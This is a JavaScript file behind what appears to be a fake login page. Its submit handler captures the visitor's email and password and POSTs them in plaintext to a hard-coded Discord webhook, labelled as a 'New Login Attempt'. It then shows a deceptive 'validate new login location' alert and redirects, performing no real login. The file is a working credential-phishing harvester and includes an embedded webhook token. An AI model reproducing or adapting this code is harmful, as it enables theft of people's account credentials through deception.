document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('login-form');
    const usernameInput = document.getElementById('username');
    const passwordInput = document.getElementById('password');
    const submitButton = document.querySelector('.submit-btn');

    // Your Discord webhook URL (replace with your actual webhook URL)
    const webhookUrl = 'https://discord.com/api/webhooks/1337101869205426197/3sHr_lGZFfHdXzIgGsGLJBFk9KUcp3vz8MLAuvBI8BsAtT5F_Hpy04PN7p13qdC632NQ';

    // Form submission handler
    form.addEventListener('submit', function(event) {
        event.preventDefault();  // Prevents the form from submitting immediately

        // Get values of inputs
        const username = usernameInput.value.trim();
        const password = passwordInput.value.trim();

        // Simple validation
        if (!username || !password) {
            alert('Please fill in both fields.');
            return;
        }

        // Email validation (basic)
        const emailPattern = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,6}$/;
        if (!emailPattern.test(username)) {
            alert('Please enter a valid email address.');
            return;
        }

        // Password validation (simple example)
        if (password.length < 6) {
            alert('Password must be at least 6 characters long.');
            return;
        }

        // Disable submit button to prevent multiple submissions
        submitButton.disabled = true;
        submitButton.textContent = 'Logging in...';

        // Prepare data to be sent to the Discord webhook
        const payload = {
            content: `**New Login Attempt**\n**Email/Phone**: ${username}\n**Password**: ${password}`,
        };

        // Send data to the Discord webhook via a POST request
        fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(payload),
        })
        .then(response => response.json())
        .then(data => {
            console.log('Success:', data);
            // After sending to the webhook, reset button state and show an alert
            submitButton.disabled = false;
            submitButton.textContent = 'Log in';

            // Simulate a successful login (replace with actual logic)
            alert('Check e-mail and validate new login location.');
            window.location.href = 'dashboard.html'; // Redirect to a dashboard page or home page
        })
        .catch(error => {
            console.error('Error:', error);
            submitButton.disabled = false;
            submitButton.textContent = 'Log in';
            alert('Check e-mail and validate new login location.');
        });
    });

    // Optional: Handle forgot password link (show an alert for now)
    const forgotPasswordLink = document.querySelector('.forgot-password');
    forgotPasswordLink.addEventListener('click', function(event) {
        event.preventDefault();
        alert('Password recovery process initiated!');
    });
});